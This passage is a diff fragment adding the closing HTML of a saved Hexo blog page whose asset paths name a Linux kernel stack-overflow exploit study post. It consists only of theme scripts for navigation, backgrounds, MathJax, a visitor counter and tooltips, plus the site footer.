href="/2015/12/27/Hexo-use-Introduction/">Hexo的使用介绍</a></li></ul>
+<script src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+<script>
+</script>
+
+<footer id="footer">
+<div class="outer">
+<div id="footer-info">
+<div class="footer-left">
+                © 2017 Swing|浮生若梦
+            </div>
+<div class="footer-right">
+<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+</div>
+<div class="visit">
+<span id="busuanzi_container_site_pv" style="display:none">
+<span id="site-visit">表哥到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+</span>
+</span>
+<span>, </span>
+<span id="busuanzi_container_page_pv" style="display:none">
+<span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+</div>
+</div>
+</footer>
+
+<script src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/main.js"></script>
+<script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(http://oezgohqzq.bkt.clouddn.com/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+<script src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/MathJax.jsconfig=TeX-AMS-MML_HTMLorMML" type="text/javascript">
+</script>
+<div class="scroll" id="scroll">
+<a href="#"><i class="fa fa-arrow-up"></i></a>
+<a href="#comments"><i class="fa fa-comments-o"></i></a>
+<a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+<script async="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/busuanzi.pure.mini.js">
+</script>
+<script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
